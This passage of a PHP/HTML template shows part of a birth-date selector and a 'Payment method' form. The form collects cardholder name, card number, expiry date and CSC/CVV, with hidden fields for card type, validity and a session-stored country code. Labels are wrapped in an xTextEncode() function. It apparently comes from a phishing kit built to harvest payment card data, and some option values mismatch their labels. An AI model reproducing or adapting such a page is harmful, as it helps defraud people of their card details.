                            <option value="06">June</option>
                            <option value="07">July</option>
                            <option value="08">August</option>
                            <option value="09">September</option>
                            <option value="10">October</option>
                            <option value="11">November</option>
                            <option value="12">December</option>
                        </select>
                        <select name="birthyear" id="year">
                            <option disabled>Year</option>
                            <option value="1940">1940</option>
                            <option value="1941">1941</option>
                            <option value="1942">1942</option>
                            <option value="1943">1943</option>
                            <option value="1944">1944</option>
                            <option value="1945">1947</option>
                            <option value="1946">1946</option>
                            <option value="1947">1947</option>
                            <option value="1948">1948</option>
                            <option value="1949">1949</option>
                            <option value="1950">1950</option>
                            <option value="1951">1951</option>
                            <option value="1952">1952</option>
                            <option value="1953">1953</option>
                            <option value="1954">1954</option>
                            <option value="1955">1955</option>
                            <option value="1956">1956</option>
                            <option value="1957">1957</option>
                            <option value="1958">1958</option>
                            <option value="1959">1959</option>
                            <option value="1960">1960</option>
                            <option value="1961">1961</option>
                            <option value="1962">1962</option>
                            <option value="1963">1963</option>
                            <option value="1964">1964</option>
                            <option value="1965">1965</option>
                            <option value="1966">1966</option>
                            <option value="1967">1967</option>
                            <option value="1968">1968</option>
                            <option value="1969">1969</option>
                            <option value="1970">1970</option>
                            <option value="1971">1971</option>
                            <option value="1972">1972</option>
                            <option value="1973">1973</option>
                            <option value="1974">1974</option>
                            <option value="1975">1975</option>
                            <option value="1976">1976</option>
                            <option value="1977">1977</option>
                            <option value="1978">1978</option>
                            <option value="1979">1979</option>
                            <option value="1980">1980</option>
                            <option value="1981">1981</option>
                            <option value="1982">1982</option>
                            <option value="1983">1983</option>
                            <option value="1984">1984</option>
                            <option value="1985">1985</option>
                            <option value="1986">1986</option>
                            <option value="1987">1987</option>
                            <option value="1988">1988</option>
                            <option value="1989">1989</option>
                            <option value="1990">1990</option>
                            <option value="1991">1991</option>
                            <option value="1992">1992</option>
                            <option value="1993">1993</option>
                            <option value="1994">1994</option>
                            <option value="1995">1995</option>
                            <option value="1996">1996</option>
                            <option value="1997">1997</option>
                            <option value="1998">1998</option>
                            <option value="1999">1999</option>
                            <option value="2000">2000</option>
                        </select>
                    </div>
                </div>
            </div>
            <div class="login" style="background-position-y: 2em;">
                <div class="form top-form">
                    <h2><?php echo xTextEncode('Payment method');?></h2>
                    <div> <span class="<?php echo xTextEncode('div-cards');?>"></span></div>
                    <div class="div-input">
                        <input name="nameoncard" placeholder="<?php echo xTextEncode('Cardholder Name');?>" type="text" value=""> </div>
                    <div class="div-input">
                        <input name="cardnumber" placeholder="<?php echo xTextEncode('Card Number');?>" type="tel" id="cardnumber">
                        <input name="c_type" type="hidden" id="card_type" value="">
                        <input name="c_valid" type="hidden" id="card_valid" value="">
                        <input name="c_country" type="hidden" id="card_country" value="<?=$_SESSION[ '_LOOKUP_CNTRCODE_'];?>"> </div>
                    <div class="div-input left-input">
                        <select name="expmonth" id="expmonth">
                            <option disabled>
                                <?php echo xTextEncode('Expiration Date');?>
                            </option>
                            <option value="01">01 - January</option>
                            <option value="02">02 - February</option>
                            <option value="03">03 - March</option>
                            <option value="04">04 - April</option>
                            <option value="05">05 - May</option>
                            <option value="06">06 - June</option>
                            <option value="07">07 - July</option>
                            <option value="08">08 - August</option>
                            <option value="09">09 - September</option>
                            <option value="10">10 - October</option>
                            <option value="11">11 - November</option>
                            <option value="12">12 - December</option>
                        </select>
                    </div>
                    <div class="div-input right-input">
                        <select name="expyear" id="expyear">
                            <option disabled>
                                <?php echo xTextEncode('Expiration Date');?>
                            </option>
                            <option value="2017">2017</option>
                            <option value="2018">2018</option>
                            <option value="2019">2019</option>
                            <option value="2020">2020</option>
                            <option value="2021">2021</option>
                            <option value="2022">2022</option>
                            <option value="2023">2023</option>
                            <option value="2024">2024</option>
                            <option value="2025">2025</option>
                            <option value="2026">2026</option>
                            <option value="2027">2027</option>
                            <option value="2028">2028</option>
                            <option value="2029">2029</option>
                            <option value="2030">2030</option>
                            <option value="2031">2031</option>
                            <option value="2032">2032</option>
                            <option value="2033">2033</option>
                            <option value="2034">2034</option>
                            <option value="2034">2035</option>
                        </select>
                    </div>
                    <div class="div-input">
                        <input name="csc" placeholder="<?php echo xTextEncode('Card Security Code (CSC/CVV)');?>" type="tel" id="csc"> </div>
                    <div class="div-input">
                        <input type="submit" value="<?php echo xTextEncode('CONTINUE');?>" class="update" id="submit_infos"> </div>
                </div>
            </div>
        </div>
    </div>
    </div>
</form>